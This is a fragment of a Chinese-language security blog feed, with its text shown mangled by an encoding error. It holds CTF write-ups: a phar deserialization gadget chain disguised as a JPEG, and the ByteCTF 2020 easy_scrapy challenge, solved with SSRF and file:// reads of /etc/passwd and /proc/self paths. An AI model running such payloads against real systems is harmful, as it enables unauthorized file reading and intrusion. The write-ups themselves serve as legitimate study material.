class="hljs-title">extends</span> \<span class="hljs-title">PHPGGC</span>\<span class="hljs-title">GadgetChain</span>\<span class="hljs-title">FileRead</span> &#123;<br>        public static $version = &#x27;1.00&#x27;;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $vector = <span class="hljs-string">&#x27;__destruct&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> $author = <span class="hljs-string">&#x27;teamrocketist&#x27;</span>;<br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> $parameters</span>) </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> \PDFStuff\PDFCreator();<br>            $a-&gt;tmpfile = $parameters[<span class="hljs-string">&quot;remote_file&quot;</span>]; <span class="hljs-comment">// file to read</span><br>            <span class="hljs-keyword">return</span> $a;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ versionã€vectorã€author åœ¨æŸ¥çœ‹å½“å‰æ¨¡å—ä¿¡æ¯çš„æ—¶å€™ä¼šæ˜¾ç¤ºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1B804691-FA75-4CAF-9B5C-4305E7974FF1.png"></p><p>æ„å»ºpharçš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./phpggc Alles/FR1 flag.php -f -pj ../dummy.jpg -o ../exploit.jpg<br></code></pre></td></tr></table></figure><p>å‚æ•°ã€Œ-fã€ä½¿ç”¨ fast-destruct çš„æ–¹æ³•ï¼Œç¡®ä¿å¯¹è±¡åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œèƒ½è¢«æ‘§æ¯ã€‚å‚æ•°ã€Œ-pjã€åˆ›å»º jpeg æ ¼å¼çš„ pharï¼Œdummy.jpg æ˜¯ä¸€å¼ æ™®é€šå›¾ç‰‡ã€‚å‚æ•°ã€Œ-oã€æ˜ç¡®è¯´æ˜ payload çš„è¾“å‡ºåœ°å€ã€‚flag.php æ˜¯æ¨¡å—éœ€è¦çš„å‚æ•°ï¼Œéœ€è¦è¯»å–çš„è¿œç¨‹æ–‡ä»¶çš„åœ°å€</p><hr><h1 id="ååºåˆ—åŒ–åˆ†æ"><a href="#ååºåˆ—åŒ–åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–åˆ†æ"></a>ååºåˆ—åŒ–åˆ†æ</h1><p>åœ¨æœç´¢åˆ° TCPDF çš„ cveï¼Œæ¼æ´æ˜¯ç”±äº phar ç±»å‹çš„ php ååºåˆ—åŒ–å¯¼è‡´çš„ã€‚æ•…å¯»æ‰¾ TCPDF çš„åˆ©ç”¨ç‚¹ã€‚è¿™ä¸ªåœ°æ–¹éœ€è¦ä½¿ç”¨åˆ°å¤§å‹ä»£ç å®¡è®¡çš„æŠ€å·§ï¼Œé€šå¸¸å¯ä»¥æŒ‰ç…§å¦‚ä¸‹æ‰€ç¤ºçš„å‡ ä¸ªæ­¥éª¤æ¥è¿›è¡Œå®¡è®¡ã€‚</p><ol><li>æ‰¾åˆ°å±é™©å‡½æ•°ï¼›æ­¤å¤„çš„å±é™©å‡½æ•°ä¸€å®šåœ¨ ååºåˆ—åŒ–æ‰€ä½¿ç”¨åˆ°çš„ç±»ï¼Œä¸€å®šåœ¨ç±»é‡Œçš„é­”æœ¯æ–¹æ³•é‡Œã€‚</li><li>å‘ä¸Šå›æº¯å¯»æ‰¾æœ‰æ— å¯ç”¨è¾“å…¥ç‚¹ï¼›å¯»æ‰¾å¯æ§è¾“å…¥ç‚¹ã€‚</li><li>å°è¯•ç»•è¿‡é’ˆå¯¹è¾“å…¥ç‚¹çš„è¿‡æ»¤ï¼›</li><li>å¯»æ‰¾è§¦å‘æ¼æ´çš„æ–¹æ³•ã€‚</li></ol><p>è€Œè¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†æ¼æ´ï¼Œå°±éœ€è¦å…ˆç†æ¸…ä»£ç çš„åŸºæœ¬é€»è¾‘æ€è·¯ã€‚ï¼ˆå…³é”®ç‚¹è‚¯å®šåœ¨ã€Œç±»ã€ä¸­ï¼Œæ¯•ç«Ÿè¿™ä¸ªé¢˜çš„è€ƒç‚¹æ˜¯ååºåˆ—åŒ–ï¼‰ï¼Œå¯ä»¥è€ƒè™‘ç›´æ¥å®¡è®¡ååºåˆ—åŒ–ä»£ç ï¼Œå†å›æº¯åˆ©ç”¨ç‚¹ã€‚</p><p>å…ˆåœ¨ creator.php ä¸­æ‰¾åˆ°é­”æœ¯æ–¹æ³•ï¼Œå¹¶å¯»æ‰¾å±é™©å‡½æ•°ï¼ˆç”±äº this-&gt;tmpfile åœ¨ååºåˆ—æ—¶å¯æ§ï¼‰ï¼Œæ•…éœ€è¦è¿›è¡Œååºåˆ—åŒ–ç„¶åæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œtmpfile è®¾ç½®ä¸ºæˆ‘ä»¬éœ€è¦çš„å‡½æ•°ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/A5780B58-D39F-4E52-809F-EA15216A4BB0.png"></p><p>ç¼–å†™ç”Ÿæˆ phar ä»£ç </p><ul><li>æ–¹æ³•1: phpggc å·¥å…·<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D31F2612-132F-48E3-BBA0-8B99AA623F93.png"></li><li>æ–¹æ³•2:æ‰‹åŠ¨ç¼–å†™<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/1E138875-D810-430B-ABD0-9F4594E2C11D.png"></li></ul><p>æœ€åéœ€è¦ä½¿ç”¨åŒ…è£…å™¨æ‰§è¡Œä»£ç ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20201101001720.png"></p><p>å‚è€ƒæ•™ç¨‹ï¼š</p><ol><li><a href="https://xz.aliyun.com/t/6699#toc-2">phpååºåˆ—åŒ–æ‹“å±•æ”»å‡»è¯¦è§£â€“phar</a></li><li><a href="https://teamrocketist.github.io/2019/08/25/Web-Chaos-Communication-Camp-2019-CTF-pdfcreator/">Chaos Communication Camp 2019 CTF - pdfcreator</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phpååºåˆ—åŒ–</tag>
      
      <tag>phar</tag>
      
      <tag>ä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020å¹´10æœˆByteCTFéƒ¨åˆ†webé¢˜è§£</title>
    <link href="/2020/10/25/2020%E5%B9%B410%E6%9C%8825%E6%97%A5-ByteCTF%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/10/25/2020%E5%B9%B410%E6%9C%8825%E6%97%A5-ByteCTF%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>é¢˜è§£å’Œé¢˜ç›®åœ°å€ï¼š<a href="https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md">https://github.com/ctfwiki/ctf_game_history/blob/master/2020/ByteCTF.md</a><br>å®˜æ–¹é¢˜è§£ï¼š<a href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#xQHQ9D</a></p><hr><a id="more"></a><p>ç”¨äºçˆ†ç ´ md5 çš„è„šæœ¬ï¼ˆéªŒè¯ç ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># crack.py</span><br><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    c = input()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">9999999999</span>):<br>        <span class="hljs-keyword">if</span> md5(str(i)).startswith(c):<br>            print(i)<br>            print(<span class="hljs-string">&#x27;----------------&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><hr><h1 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h1><ul><li>é¢˜ç›®åœ°å€ï¼š<a href="http://101.200.50.18:30010/">http://101.200.50.18:30010/</a></li><li>å®˜æ–¹é¢˜è§£ï¼š<a href="https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC">https://bytectf.feishu.cn/docs/doccnqzpGCWH1hkDf5ljGdjOJYg#bFxJPC</a></li><li>oxccccccï¼š<a href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></li><li>N0rth3é¢˜è§£ï¼š<a href="https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</a></li><li>ByteCTF2020-easyscrapyï¼š<a href="https://www.jianshu.com/p/0823666a7687">https://www.jianshu.com/p/0823666a7687</a></li><li>ByteCTF2020â€”w4nderï¼š<a href="http://phoebe233.cn/?p=328#easyscrapy">http://phoebe233.cn/?p=328#easyscrapy</a></li></ul><p>ç»è¿‡æµ‹è¯•ï¼Œè¯¥ç½‘ç«™ä¼šçˆ¬å–æäº¤çš„é“¾æ¥ä»¥åŠé“¾æ¥ä¸­çš„å¤–é“¾ï¼Œå¹¶ä¸”æäº¤é“¾æ¥çš„ç±»å‹åªèƒ½æ˜¯ HTTPSã€‚æˆ‘å½“æ—¶åªåœ¨æäº¤é“¾æ¥çš„éƒ¨åˆ†æµ‹è¯•äº†SSRFï¼Œä»¥ååœ¨åšé¢˜æ—¶ï¼Œéœ€è¦è¾¹åšè¾¹å†™é¢˜è§£ï¼Œè¿™æ ·ä¼šè®©è‡ªå·±çš„æ€è·¯æ›´åŠ çš„æ¸…æ™°å’Œæ­£ç¡®ã€‚</p><p>åœ¨ æœåŠ¡å™¨ç¼–å†™ 1.html ï¼Œç„¶åæäº¤ url å³å¯å¾—åˆ° /etc/passwd æ–‡ä»¶ï¼ŒæˆåŠŸæœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œè¿”å›ç»“æœå¦‚ä¸‹ã€‚</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sml"><br>b&#x27;&lt;a href=<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;\n&#x27;<br><br></code></pre></td></tr></table></figure><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C64DAEFD-214C-40D8-8BFF-24326D290575.png"></p><p>è€ƒè™‘å»è¯»å–çˆ¬è™«çš„æºç ï¼Œä½†æ˜¯å¹¶ä¸çŸ¥é“è·¯å¾„ï¼Œå°è¯• proc ç›®å½•ã€‚GET æ–°å§¿åŠ¿ï¼Œåœ¨æœåŠ¡å™¨æºç ä¸­å†™å…¥ä¸‹é¢çš„ä»£ç å¹¶æäº¤ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cmdline&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>proc/self/cmdline ä¸­ /proc/self  æ˜¯æŒ‡å‘å½“å‰è¿›ç¨‹çš„å†…å­˜ï¼Œ/proc/self/cmdline å¯åŠ¨è¿›ç¨‹æ—¶æ‰§è¡Œçš„å‘½ä»¤ã€‚ç±»ä¼¼çš„æ¥å£è¿˜æœ‰ï¼š</p><ul><li>/proc/$PID/environ è¯¥æ–‡ä»¶ä¿å­˜è¿›ç¨‹çš„ç¯å¢ƒå˜é‡</li><li>/proc/$PID/cwd ä¸€ä¸ªç¬¦å·è¿æ¥, æŒ‡å‘è¿›ç¨‹å½“å‰çš„å·¥ä½œç›®å½•</li><li>/proc/$PID/exe ä¸€ä¸ªç¬¦å·è¿æ¥, æŒ‡å‘è¢«æ‰§è¡Œçš„äºŒè¿›åˆ¶ä»£ç </li><li>/proc/$PID/fd è¿›ç¨‹æ‰€æ‰“å¼€çš„æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªç¬¦å·è¿æ¥åœ¨è¯¥å­ç›®å½•é‡Œ, ä»¥æ–‡ä»¶æè¿°ç¬¦å‘½å, è¿™ä¸ªåå­—å®é™…ä¸Šæ˜¯æŒ‡å‘çœŸæ­£çš„æ–‡ä»¶çš„ç¬¦å·è¿æ¥</li><li>/proc/$PID/attr è¿›ç¨‹çš„å±æ€§<br>tip: å½“æ‰¾ä¸åˆ°ç½‘ç«™è·¯å¾„çš„æ—¶å€™ï¼Œå¯ä»¥åˆ©ç”¨ /proc/self/cwd ç›®å½•æ¥è¯»å–æ–‡ä»¶è·¯å¾„</li></ul><p>å½“æäº¤è¯·æ±‚åçš„è¿”å›ç»“æœä¸ºï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>b<span class="hljs-string">&#x27;/usr/local/bin/python\x00/usr/local/bin/scrapy\x00crawl\x00byte\x00&#x27;</span><br># è§£ç åï¼š<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>python <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>scrapy crawl <span class="hljs-keyword">byte</span><br><br></code></pre></td></tr></table></figure><p>bâ€™ æ˜¯ Python çš„ bytes ç±»å‹ï¼Œè¡¨æ˜è¿™ä¸ªå˜é‡åœ¨å­˜å‚¨çš„æ—¶å€™æ˜¯ bytes ç±»å‹ï¼ˆäºŒè¿›åˆ¶å½¢å¼ï¼‰ã€‚ä¸Šé¢çš„å‘½ä»¤å¯ä»¥è¢«åŒ–ç®€ä¸º python scrapy crawl byteï¼Œè¿™æ˜¯ scrapy çš„å¯åŠ¨å‘½ä»¤ã€‚çˆ¬è™«çš„åç§°å«åš byteï¼Œåœ¨ spiders ç›®å½•ä¸­æœ‰ç”¨ã€‚</p><h2 id="è¯»å–æ–‡ä»¶"><a href="#è¯»å–æ–‡ä»¶" class="headerlink" title="è¯»å–æ–‡ä»¶"></a>è¯»å–æ–‡ä»¶</h2><p>æˆ‘ä»¬å¯ä»¥å‚è€ƒ <a href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/topics/commands.html#scrapy">scrapy çš„æ–‡æ¡£</a>ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ scrapy çš„ç›®å½•ç»“æ„ï¼ˆè´¯ç©¿å…¨æ–‡ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>scrapy.cfg<br>myproject/ï¼ˆé¡¹ç›®åç§°ï¼ŒæœªçŸ¥ï¼‰<br>    __init__.py<br>    items.py<br>    pipelines.py<br>    settings.py<br>    spiders/<br>        __init__.py<br>        spider1.py<br>        spider2.py<br>        ...<br><br></code></pre></td></tr></table></figure><p>ç›®å½•ç»“æ„ +  /proc/self/cwd æ¥è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚é¦–å…ˆå°è¯•è¯»å– scrapy.cfg æ–‡ä»¶ï¼ˆå¦å¤–çš„æ•°æ®éœ€è¦ä½¿ç”¨é¡¹ç›®åç§°ï¼‰ã€‚æ„é€  SSRF çš„ url å¦‚ä¸‹ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/scrapy.cfg&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>å…¶ä¸­ /proc/self/cwd/ æŒ‡å‘å·¥ä½œè·¯å¾„ï¼ˆcurrent work directory ç®€ç§° cwdï¼‰ï¼Œè¯»å–å·¥ä½œè·¯å¾„ä¸‹çš„ scrapy.cfg æ–‡ä»¶ã€‚å†æ¬¡æäº¤ urlï¼Œè¿”å›ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex"># scrapy.cfg<br><br>b&#x27;# Automatically created by: scrapy startproject<span class="hljs-tag">\<span class="hljs-name">n</span></span>#<span class="hljs-tag">\<span class="hljs-name">n</span></span># For more information about the [deploy] section see:<span class="hljs-tag">\<span class="hljs-name">n</span></span># https://scrapyd.readthedocs.io/en/latest/deploy.html<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">n</span><span class="hljs-string">[settings]</span></span><span class="hljs-tag">\<span class="hljs-name">ndefault</span> = </span>bytectf.settings<span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">n</span><span class="hljs-string">[deploy]</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>#url = http://localhost:6800/<span class="hljs-tag">\<span class="hljs-name">nproject</span> = </span>bytectf<span class="hljs-tag">\<span class="hljs-name">n</span></span>&#x27;<br><br></code></pre></td></tr></table></figure><p>è¿™ç§æ ¼å¼çš„æ–‡æœ¬ä¸ä¾¿äºè¿›è¡Œé˜…è¯»ï¼ŒPython çš„ Bytes ç›´æ¥è¾“å‡ºå°±ä¼šå‘ˆç°è¿™ç§æ•ˆæœï¼Œä½¿ç”¨ vscode çš„æ›¿æ¢åŠŸèƒ½å°† \n è½¬æ¢æˆâ€œæ¢è¡Œâ€ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/472EE1BB-6765-4B4D-B9F0-341E25B7D163.png"><br>ä¿®æ”¹ä¸ºâ€œæ­£åˆ™æ¨¡å¼â€è¿›è¡Œæ›¿æ¢ï¼Œå°† â€œ\nâ€ æ›¿æ¢æˆ â€œ\nâ€ã€‚é€šè¿‡ä¸Šé¢çš„æ–‡æœ¬ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿè¯»å–æ‰€æœ‰çš„æ–‡ä»¶äº†ã€‚</p><p>å°è¯•è¯»å– setting æ–‡ä»¶ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/setting.py&quot;</span>&gt;ï¼ˆå‡­æ„Ÿè§‰åœ¨å†™ä»£ç ã€‚ã€‚ï¼‰<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/settings.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>ï¼Ÿï¼Ÿï¼Ÿåšç€åšç€è®¿é—®ä¸äº†äº†ï¼ˆå¸Œæœ›ç¯å¢ƒæ²¡äº‹ğŸ™ã€‚ç­‰å¾…å‡ åˆ†é’Ÿåç¯å¢ƒæ¢å¤ï¼Œä¼°è®¡æ˜¯åœ¨é‡å¯ã€‚</p><p>å‚è€ƒä¸Šé¢çš„å¤„ç†æ–¹æ³•ï¼Œå°†è¿”å›ç»“æœæ•´ç†å¦‚ä¸‹ï¼šï¼ˆå‚è€ƒæ•™ç¨‹ï¼š<a href="https://www.cnblogs.com/fengf233/p/11400262.html%EF%BC%89">https://www.cnblogs.com/fengf233/p/11400262.htmlï¼‰</a></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># setting.py</span><br><br>BOT_NAME = <span class="hljs-string">&#x27;bytectf&#x27;</span><br><span class="hljs-meta"># æ­¤Scrapyé¡¹ç›®åç§°</span><br><br>SPIDER_MODULES = [<span class="hljs-string">&#x27;bytectf.spiders&#x27;</span>]<br><span class="hljs-meta"># scrapyæŸ¥æ‰¾spiderçš„è·¯å¾„</span><br><br>NEWSPIDER_MODULE = <span class="hljs-string">&#x27;bytectf.spiders&#x27;</span><br><span class="hljs-meta"># æŒ‡å®šä½¿ç”¨genspideræ—¶åˆ›å»ºspiderçš„è·¯å¾„</span><br><br>RETRY_ENABLED = False<br><span class="hljs-meta"># </span><br>ROBOTSTXT_OBEY = False<br><span class="hljs-meta"># è¡¨ç¤ºéµä¸éµå®ˆå›å­åè®®ï¼Œé»˜è®¤False</span><br><br>DOWNLOAD_TIMEOUT = <span class="hljs-number">8</span><br><span class="hljs-meta"># è¶…æ—¶æ—¶é—´</span><br><br>USER_AGENT = <span class="hljs-string">&#x27;scrapy_redis&#x27;</span><br><span class="hljs-meta"># çˆ¬è™«æ—¶ä½¿ç”¨çš„é»˜è®¤User-Agent</span><br><br>SCHEDULER = <span class="hljs-string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span><br><span class="hljs-meta"># </span><br><br>DUPEFILTER_CLASS = <span class="hljs-string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span><br><span class="hljs-meta"># </span><br><br>REDIS_HOST = <span class="hljs-string">&#x27;172.20.0.7&#x27;</span><br><span class="hljs-meta"># redis æœåŠ¡å™¨åœ°å€</span><br><br>REDIS_PORT = <span class="hljs-number">6379</span><br><span class="hljs-meta"># redis ç«¯å£</span><br><br>ITEM_PIPELINES = &#123;<br><span class="hljs-string">&#x27;bytectf.pipelines.BytectfPipeline&#x27;</span>: <span class="hljs-number">300</span>,<br>&#125;<br><span class="hljs-meta"># å¯ç”¨çš„itemç®¡é“</span><br></code></pre></td></tr></table></figure><p>åœ¨å…¶ä»–äººçš„é¢˜è§£ä¸­ï¼Œä»–ä»¬å°è¯•äº†æ”»å‡» redisï¼Œä½†æ˜¯æ²¡æœ‰æ‹¿åˆ° shellã€‚æˆ‘ä¸ä¼šï¼ˆæš‚æ—¶å°±ä¸å°è¯•äº†ã€‚åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­æ²¡æœ‰ spider çš„åç§°ï¼Œè€ƒè™‘ä»  <strong>init</strong>.py è¿™ä¸ªå·²çŸ¥çš„æ–‡ä»¶å…¥æ‰‹ã€‚å°è¯•è¯»å–  <strong>init</strong>.py æ–‡ä»¶ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/spiders/__init__.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰æ•°æ®</p><p>å°è¯•è¯»å– byte.py æ–‡ä»¶ï¼ˆæš‚æ—¶è¿˜ä¸æ¸…æ¥šè¿™ä¸ªæ–‡ä»¶åã€Œbyte.pyã€çš„æ¥æºï¼ŒçŒœæµ‹å¯èƒ½åœ¨ items.pyã€pipelines.pyã€bytectf/<strong>init</strong>.py è¿™äº›æ²¡æœ‰è¯»å–çš„æ–‡ä»¶ä¸­ï¼‰ã€‚æŠ˜è…¾äº†åŠå¤©æ‰åœ¨å¯åŠ¨å‘½ä»¤ä¸­å‘ç°çˆ¬è™«çš„åç§°å«åš byte.pyï¼Œå½“æ—¶æ²¡æœ‰ç†è§£è¿™ä¸ªå‘½ä»¤çš„å«ä¹‰ï¼Œè¡€äºã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/spiders/byte.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>å°†å›æ˜¾ç»“æœè¿›è¡Œæ•´ç†ã€‚ä»£ç æœ‰ç‚¹ä¹±ï¼ŒPython çš„ç¼©è¿›å…¨æ— ï¼Œåªèƒ½ä¾é çŒœæµ‹æºç å¤§è‡´çš„æ¨¡æ ·ï¼ˆ\x ä¹±ç ä½¿ç”¨ print(bâ€â€.decode(â€œutf-8â€) è½¬æ¢ä¸ºä¸­æ–‡)ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># byte.py</span><br><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> scrapy_redis.spiders <span class="hljs-keyword">import</span> RedisSpider<br><span class="hljs-keyword">from</span> bytectf.items <span class="hljs-keyword">import</span> BytectfItem<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ByteSpider</span>(<span class="hljs-params">RedisSpider</span>):</span><br>    name = <span class="hljs-string">&#x27;byte&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span><br>        byte_item = BytectfItem()<br>        <span class="hljs-comment"># ä¸»é”®ï¼ŒåŸå§‹ url</span><br>        byte_item[<span class="hljs-string">&#x27;byte_start&#x27;</span>] = response.request.url<br>        url_list = []<br>        test = response.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>).getall()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> test:<br>            <span class="hljs-keyword">if</span> i[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;/&#x27;</span>:<br>                url = response.request.url + i<br>            <span class="hljs-keyword">else</span>:<br>                url = i<br>            <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&#x27;://&#x27;</span>, url):<br>                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="hljs-literal">True</span>)<br>                r.meta[<span class="hljs-string">&#x27;item&#x27;</span>] = byte_item<br>                <span class="hljs-keyword">yield</span> r<br>            url_list.append(url)<br>            <span class="hljs-keyword">if</span>(len(url_list) &gt; <span class="hljs-number">3</span>):<br>                <span class="hljs-keyword">break</span><br>        byte_item[<span class="hljs-string">&#x27;byte_url&#x27;</span>] = response.request.url<br>        byte_item[<span class="hljs-string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">yield</span> byte_item<br><br><br>    <span class="hljs-function"><span 